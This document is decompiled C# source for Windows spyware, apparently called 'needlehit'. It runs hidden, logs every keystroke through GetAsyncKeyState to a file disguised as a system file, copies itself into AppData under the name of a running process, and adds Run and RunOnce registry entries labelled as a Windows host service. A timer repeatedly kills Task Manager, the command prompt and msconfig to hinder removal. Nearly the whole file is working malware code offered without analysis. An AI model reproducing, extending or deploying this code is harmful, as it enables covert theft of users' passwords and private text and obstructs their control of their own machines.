using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using needlehit.My;

namespace needlehit;

[DesignerGenerated]
public class Form1 : Form
{
	public class Keylogger_
	{
		private static List<WeakReference> __ENCList = new List<WeakReference>();

		[AccessedThroughProperty("timer1_")]
		private Timer _timer1_;

		public string lol;

		public object time;

		public int counter;

		public bool sennding;

		public bool autodelet;

		public virtual Timer timer1_
		{
			[DebuggerNonUserCode]
			get
			{
				return _timer1_;
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			[DebuggerNonUserCode]
			set
			{
				EventHandler eventHandler = timer1_Tick;
				if (_timer1_ != null)
				{
					_timer1_.remove_Tick(eventHandler);
				}
				_timer1_ = value;
				if (_timer1_ != null)
				{
					_timer1_.add_Tick(eventHandler);
				}
			}
		}

		public Keylogger_()
		{
			__ENCAddToList(this);
			lol = "";
			time = 0;
			counter = 0;
			sennding = false;
			autodelet = false;
		}

		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			checked
			{
				lock (__ENCList)
				{
					if (__ENCList.Count == __ENCList.Capacity)
					{
						int num = 0;
						int num2 = __ENCList.Count - 1;
						int num3 = 0;
						while (true)
						{
							int num4 = num3;
							int num5 = num2;
							if (num4 > num5)
							{
								break;
							}
							WeakReference weakReference = __ENCList[num3];
							if (weakReference.IsAlive)
							{
								if (num3 != num)
								{
									__ENCList[num] = __ENCList[num3];
								}
								num++;
							}
							num3++;
						}
						__ENCList.RemoveRange(num, __ENCList.Count - num);
						__ENCList.Capacity = __ENCList.Count;
					}
					__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
				}
			}
		}

		[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		public static extern int GetAsyncKeyState(int vkey);

		public void start_()
		{
			//IL_0001: Unknown result type (might be due to invalid IL or missing references)
			//IL_000b: Expected O, but got Unknown
			timer1_ = new Timer();
			timer1_.set_Interval(50);
			timer1_.Start();
		}

		public void timer1_Tick(object sender, EventArgs e)
		{
			checked
			{
				try
				{
					lol += getkeypress();
					if (counter == 10)
					{
						((ServerComputer)MyProject.Computer).get_FileSystem().WriteAllText(Application.get_StartupPath() + "\\needlehit.windows32.sys", lol, true);
						lol = "";
						counter = 0;
					}
					else
					{
						counter++;
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
		}

		public string getkeypress()
		{
			int num = 1;
			int num2;
			do
			{
				if (GetAsyncKeyState(num) == -32767)
				{
					switch (num)
					{
					case 3:
						return "[ACHTUNG!!!]";
					case 4:
						return "[ACHTUNG!!!4]";
					case 5:
						return "[ACHTUNG!!!5]";
					case 6:
						return "[ACHTUNG!!6!]";
					case 7:
						return "[ACHTUNG!!!7]";
					case 8:
						return "[Backspace]";
					case 9:
						return "[Tab]";
					case 10:
						return "[ACHTUNG!!!10]";
					case 11:
						return "[ACHTUNG!!!11]";
					case 12:
						return "[ACHTUNG!!!12]";
					case 13:
						return "[Enter]";
					case 14:
						return "[ACHTUNG 14]";
					case 15:
						return "[ACHTUNG 15]";
					case 16:
						return "[Shift]";
					case 17:
						return "[Strg]";
					case 18:
						return "[Alt]";
					case 19:
						return "[ACHTUNG 19]";
					case 20:
						return "[Umstell.]";
					case 21:
						return "[ACHTUNG 21]";
					case 22:
						return "[ACHTUNG 22]";
					case 23:
						return "[ACHTUNG 23]";
					case 24:
						return "[ACHTUNG 24]";
					case 25:
						return "[ACHTUNG 25]";
					case 26:
						return "[ACHTUNG 26]";
					case 27:
						return "[ACHTUNG 27]";
					case 28:
						return "[ACHTUNG 28]";
					case 29:
						return "[ACHTUNG 29]";
					case 30:
						return "[ACHTUNG 30]";
					case 31:
						return "[ACHTUNG 31]";
					case 32:
						return " ";
					case 33:
						return "!";
					case 34:
						return "\u00b4\u00b4";
					case 35:
						return "#";
					case 36:
						return "$";
					case 37:
						return "%";
					case 38:
						return "&";
					case 39:
						return "'";
					case 40:
						return "(";
					case 41:
						return ")";
					case 42:
						return "*";
					case 43:
						return "+";
					case 44:
						return ",";
					case 45:
						return "-";
					case 46:
						return ".";
					case 47:
						return "/";
					case 48:
						return "0";
					case 49:
						return "1";
					case 50:
						return "2";
					case 51:
						return "3";
					case 52:
						return "4";
					case 53:
						return "5";
					case 54:
						return "6";
					case 55:
						return "7";
					case 56:
						return "8";
					case 57:
						return "9";
					case 58:
						return ":";
					case 59:
						return ";";
					case 60:
						return "<";
					case 61:
						return "=";
					case 62:
						return ">";
					case 63:
						return "?";
					case 64:
						return "@";
					case 65:
						return "a";
					case 66:
						return "b";
					case 67:
						return "c";
					case 68:
						return "d";
					case 69:
						return "e";
					case 70:
						return "f";
					case 71:
						return "g";
					case 72:
						return "h";
					case 73:
						return "i";
					case 74:
						return "j";
					case 75:
						return "k";
					case 76:
						return "l";
					case 77:
						return "m";
					case 78:
						return "n";
					case 79:
						return "o";
					case 80:
						return "p";
					case 81:
						return "q";
					case 82:
						return "r";
					case 83:
						return "s";
					case 84:
						return "t";
					case 85:
						return "u";
					case 86:
						return "v";
					case 87:
						return "w";
					case 88:
						return "x";
					case 89:
						return "y";
					case 90:
						return "z";
					case 91:
						return "[Win]";
					case 92:
						return "[Win]";
					case 93:
						return "]";
					case 94:
						return "^";
					case 95:
						return "_";
					case 96:
						return "`";
					case 97:
						return "a";
					case 98:
						return "b";
					case 99:
						return "c";
					case 100:
						return "d";
					case 101:
						return "e";
					case 102:
						return "f";
					case 103:
						return "g";
					case 104:
						return "h";
					case 105:
						return "i";
					case 106:
						return "j";
					case 107:
						return "k";
					case 108:
						return "l";
					case 109:
						return "m";
					case 110:
						return "n";
					case 111:
						return "o";
					case 112:
						return "[F1]";
					case 113:
						return "[F2]";
					case 114:
						return "[F3]";
					case 115:
						return "[F4]";
					case 116:
						return "[F5]";
					case 117:
						return "[F6]";
					case 118:
						return "[F7]";
					case 119:
						return "[F8]";
					case 120:
						return "[F9]";
					case 121:
						return "[F10]";
					case 122:
						return "[F11]";
					case 123:
						return "[F12]";
					case 124:
						return "|";
					case 125:
						return "}";
					case 126:
						return "~";
					case 127:
						return "[ACHTUNG 127]";
					case 128:
						return "€";
					case 129:
						return "[ACHTUNG 129]";
					case 130:
						return "‚";
					case 131:
						return "ƒ";
					case 132:
						return "„";
					case 133:
						return "…";
					case 134:
						return "†";
					case 135:
						return "‡";
					case 136:
						return "ˆ";
					case 137:
						return "[ACHTUNG 137]";
					case 138:
						return "Š";
					case 139:
						return "‹";
					case 140:
						return "[ACHTUNG 140]";
					case 141:
						return "[ACHTUNG 141]";
					case 142:
						return "Ž";
					case 143:
						return "[ACHTUNG 143]";
					case 144:
						return "[ACHTUNG 144]";
					case 145:
						return "‘";
					case 146:
						return "’";
					case 147:
						return "\"";
					case 148:
						return "\"";
					case 149:
						return "•";
					case 150:
						return "–";
					case 151:
						return "—";
					case 152:
						return "\u02dc";
					case 153:
						return "™";
					case 154:
						return "š";
					case 155:
						return "›";
					case 156:
						return "[ACHTUNG 155]";
					case 157:
						return "[ACHTUNG 157]";
					case 158:
						return "ž";
					case 159:
						return "Ÿ";
					case 160:
						return "";
					case 161:
						return "";
					case 162:
						return "";
					case 163:
						return "";
					case 164:
						return "[Alt]";
					case 165:
						return "[Alt]";
					case 166:
						return "¦";
					case 167:
						return "§";
					case 168:
						return "\u00a8";
					case 169:
						return "©";
					case 170:
						return "ª";
					case 171:
						return "«";
					case 172:
						return "¬";
					case 173:
						return "[ACHTUNG 173]";
					case 174:
						return "®";
					case 175:
						return "\u00af";
					case 176:
						return "°";
					case 177:
						return "±";
					case 178:
						return "²";
					case 179:
						return "³";
					case 180:
						return "\u00b4";
					case 181:
						return "µ";
					case 182:
						return "[ACHTUNG 182]";
					case 183:
						return ".";
					case 184:
						return "\u00b8";
					case 185:
						return "¹";
					case 186:
						return "ü";
					case 187:
						return "+";
					case 188:
						return ",";
					case 189:
						return "-";
					case 190:
						return ".";
					case 191:
						return "¿";
					case 192:
						return "ö";
					case 193:
						return "Á";
					case 194:
						return "Â";
					case 195:
						return "Ã";
					case 196:
						return "Ä";
					case 197:
						return "Æ";
					case 198:
						return "Ç";
					case 199:
						return "È";
					case 200:
						return "É";
					case 201:
						return "Ê";
					case 202:
						return "Ë";
					case 203:
						return "Ì";
					case 204:
						return "Í";
					case 205:
						return "Í";
					case 206:
						return "Î";
					case 207:
						return "Ï";
					case 208:
						return "Ð";
					case 209:
						return "Ñ";
					case 210:
						return "Ò";
					case 211:
						return "Ó";
					case 212:
						return "Ô";
					case 213:
						return "Õ";
					case 214:
						return "Ö";
					case 215:
						return "×";
					case 216:
						return "Ø";
					case 217:
						return "Ù";
					case 218:
						return "Ú";
					case 219:
						return "Û";
					case 220:
						return "Ü";
					case 221:
						return "Ý";
					case 222:
						return "ä";
					case 223:
						return "ß";
					case 224:
						return "à";
					case 225:
						return "á";
					case 226:
						return "â";
					case 227:
						return "<";
					case 228:
						return "ä";
					case 229:
						return "æ";
					case 230:
						return "ç";
					case 231:
						return "è";
					case 232:
						return "é";
					case 233:
						return "ê";
					case 234:
						return "ë";
					case 235:
						return "ì";
					case 236:
						return "í";
					case 237:
						return "í";
					case 238:
						return "î";
					case 239:
						return "ï";
					case 240:
						return "ð";
					case 241:
						return "ñ";
					case 242:
						return "ò";
					case 243:
						return "ó";
					case 244:
						return "ô";
					case 245:
						return "õ";
					case 246:
						return "ö";
					case 247:
						return "÷";
					case 248:
						return "ø";
					case 249:
						return "ù";
					case 250:
						return "ú";
					case 251:
						return "û";
					case 252:
						return "ü";
					case 253:
						return "ý";
					case 254:
						return "þ";
					case 255:
						return "ÿ";
					}
				}
				num = checked(num + 1);
				num2 = num;
				int num3 = 255;
			}
			while (num2 <= 255);
			string result = default(string);
			return result;
		}

		public string vernerd(string text, string keya)
		{
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
			byte[] key = mD5CryptoServiceProvider.ComputeHash(Encoding.UTF8.GetBytes(keya));
			mD5CryptoServiceProvider.Clear();
			rijndaelManaged.Key = key;
			rijndaelManaged.GenerateIV();
			byte[] iV = rijndaelManaged.IV;
			MemoryStream memoryStream = new MemoryStream();
			memoryStream.Write(iV, 0, iV.Length);
			CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			byte[] bytes = Encoding.UTF8.GetBytes(text);
			cryptoStream.Write(bytes, 0, bytes.Length);
			cryptoStream.FlushFinalBlock();
			byte[] inArray = memoryStream.ToArray();
			cryptoStream.Close();
			rijndaelManaged.Clear();
			return Convert.ToBase64String(inArray);
		}

		public string entnerd(string text, string keya)
		{
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
			byte[] key = mD5CryptoServiceProvider.ComputeHash(Encoding.UTF8.GetBytes(keya));
			mD5CryptoServiceProvider.Clear();
			byte[] buffer = Convert.FromBase64String(text);
			MemoryStream memoryStream = new MemoryStream(buffer);
			byte[] array = new byte[16];
			memoryStream.Read(array, 0, 16);
			rijndaelManaged.IV = array;
			rijndaelManaged.Key = key;
			CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Read);
			byte[] array2 = new byte[checked((int)(memoryStream.Length - 16L) + 1)];
			int count = cryptoStream.Read(array2, 0, array2.Length);
			cryptoStream.Close();
			rijndaelManaged.Clear();
			return Encoding.UTF8.GetString(array2, 0, count);
		}
	}

	private static List<WeakReference> __ENCList = new List<WeakReference>();

	private IContainer components;

	[AccessedThroughProperty("Timer1")]
	private Timer _Timer1;

	private Random rnd;

	internal virtual Timer Timer1
	{
		[DebuggerNonUserCode]
		get
		{
			return _Timer1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer1_Tick;
			if (_Timer1 != null)
			{
				_Timer1.remove_Tick(eventHandler);
			}
			_Timer1 = value;
			if (_Timer1 != null)
			{
				_Timer1.add_Tick(eventHandler);
			}
		}
	}

	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		__ENCAddToList(this);
		rnd = new Random();
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	private static void __ENCAddToList(object value)
	{
		checked
		{
			lock (__ENCList)
			{
				if (__ENCList.Count == __ENCList.Capacity)
				{
					int num = 0;
					int num2 = __ENCList.Count - 1;
					int num3 = 0;
					while (true)
					{
						int num4 = num3;
						int num5 = num2;
						if (num4 > num5)
						{
							break;
						}
						WeakReference weakReference = __ENCList[num3];
						if (weakReference.IsAlive)
						{
							if (num3 != num)
							{
								__ENCList[num] = __ENCList[num3];
							}
							num++;
						}
						num3++;
					}
					__ENCList.RemoveRange(num, __ENCList.Count - num);
					__ENCList.Capacity = __ENCList.Count;
				}
				__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
			}
		}
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if ((disposing && components != null) ? true : false)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		components = new Container();
		Timer1 = new Timer(components);
		((Control)this).SuspendLayout();
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		Size clientSize = new Size(256, 154);
		((Form)this).set_ClientSize(clientSize);
		((Control)this).set_Name("Form1");
		((Form)this).set_Text("Form1");
		((Control)this).ResumeLayout(false);
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowInTaskbar(false);
		((Control)this).set_Visible(false);
		if (!((ServerComputer)MyProject.Computer).get_FileSystem().FileExists(Path.Combine(Application.get_StartupPath(), "74936498236494560934659440534.txt")))
		{
			if (!((ServerComputer)MyProject.Computer).get_FileSystem().FileExists(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "needlehit.sys")))
			{
				((ServerComputer)MyProject.Computer).get_FileSystem().MoveFile(Application.get_ExecutablePath(), Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "needlehit.exe"));
				((ServerComputer)MyProject.Computer).get_FileSystem().WriteAllText(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "needlehit.sys"), "#Processname+-0-0-0-#DECRIPTFISH+" + generate(), false);
			}
			if (Operators.CompareString(read_proporty(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "needlehit.sys"), "DECRIPTFISH"), Interaction.Command(), false) == 0)
			{
				save_proporty(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "needlehit.sys"), "DECRIPTFISH", generate());
			}
			change_name();
			Aut();
		}
		else
		{
			((Form)this).Close();
		}
	}

	public string generate()
	{
		string text = "";
		int num = 0;
		checked
		{
			do
			{
				char[] array = Conversions.ToCharArrayRankOne("QWERTZUIOPASDFGHJKLYXCVBNM12345567890");
				text += Conversions.ToString(array[rnd.Next(0, array.Length - 1)]);
				num++;
			}
			while (num <= 30);
			return text;
		}
	}

	public void Aut()
	{
		string path = read_proporty(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "needlehit.sys"), "Processname");
		string text = read_proporty(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "needlehit.sys"), "DECRIPTFISH");
		RegistryKey registryKey = ((ServerComputer)MyProject.Computer).get_Registry().get_CurrentUser().CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run");
		registryKey.SetValue("Wohost Windows OTP Host", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), path) + " " + text);
		registryKey.Close();
		RegistryKey registryKey2 = ((ServerComputer)MyProject.Computer).get_Registry().get_CurrentUser().CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce");
		registryKey2.SetValue("Ageboot", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), path) + " " + text);
		registryKey2.Close();
	}

	public void change_name()
	{
		Process[] processes = Process.GetProcesses();
		string text = "";
		do
		{
			text = processes[rnd.Next(0, 5)].ProcessName;
		}
		while (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + text + ".exe"));
		string text2 = read_proporty(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "needlehit.sys"), "Processname");
		if (Operators.CompareString(text2, "-0-0-0-", false) == 0)
		{
			text2 = "needlehit.exe";
		}
		((ServerComputer)MyProject.Computer).get_FileSystem().RenameFile(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), text2), text + ".exe");
		save_proporty(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "needlehit.sys"), "Processname", text + ".exe");
	}

	public void save_proporty(string file, string zelle, string data)
	{
		checked
		{
			if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists(file))
			{
				string[] array = ((ServerComputer)MyProject.Computer).get_FileSystem().ReadAllText(file).Split(new char[1] { '#' });
				int num = array.Length - 1;
				int num2 = 0;
				string[] array2;
				while (true)
				{
					int num3 = num2;
					int num4 = num;
					if (num3 <= num4)
					{
						array2 = array[num2].Split(new char[1] { '+' });
						if (Operators.CompareString(array2[0], zelle, false) == 0)
						{
							break;
						}
						num2++;
						continue;
					}
					((ServerComputer)MyProject.Computer).get_FileSystem().WriteAllText(file, "#" + zelle + "+" + data, true);
					return;
				}
				array[num2] = array[num2].Replace(array2[1], data);
				string text = "";
				int num5 = array.Length - 1;
				int num6 = 0;
				while (true)
				{
					int num7 = num6;
					int num4 = num5;
					if (num7 > num4)
					{
						break;
					}
					text = Conversions.ToString(Operators.ConcatenateObject((object)text, Operators.ConcatenateObject((object)array[num6], Interaction.IIf(num6 == array.Length - 1, (object)"", (object)"#"))));
					num6++;
				}
				((ServerComputer)MyProject.Computer).get_FileSystem().WriteAllText(file, text, false);
			}
			else
			{
				((ServerComputer)MyProject.Computer).get_FileSystem().WriteAllText(file, "#" + zelle + "+" + data, true);
			}
		}
	}

	public string read_proporty(string file, string zelle)
	{
		string[] array = ((ServerComputer)MyProject.Computer).get_FileSystem().ReadAllText(file).Split(new char[1] { '#' });
		checked
		{
			int num = array.Length - 1;
			int num2 = 0;
			string[] array2;
			while (true)
			{
				int num3 = num2;
				int num4 = num;
				if (num3 <= num4)
				{
					array2 = array[num2].Split(new char[1] { '+' });
					if (Operators.CompareString(array2[0], zelle, false) == 0)
					{
						break;
					}
					num2++;
					continue;
				}
				return "-0-0-0-";
			}
			return array2[1];
		}
	}

	public void Kill_Process(string st)
	{
		Process[] processesByName = Process.GetProcessesByName(st);
		checked
		{
			int num = processesByName.Count() - 1;
			int num2 = 0;
			while (true)
			{
				int num3 = num2;
				int num4 = num;
				if (num3 <= num4)
				{
					processesByName[num2].Kill();
					num2++;
					continue;
				}
				break;
			}
		}
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		Kill_Process("taskmgr");
		Kill_Process("cmd");
		Kill_Process("msconfig");
	}
}
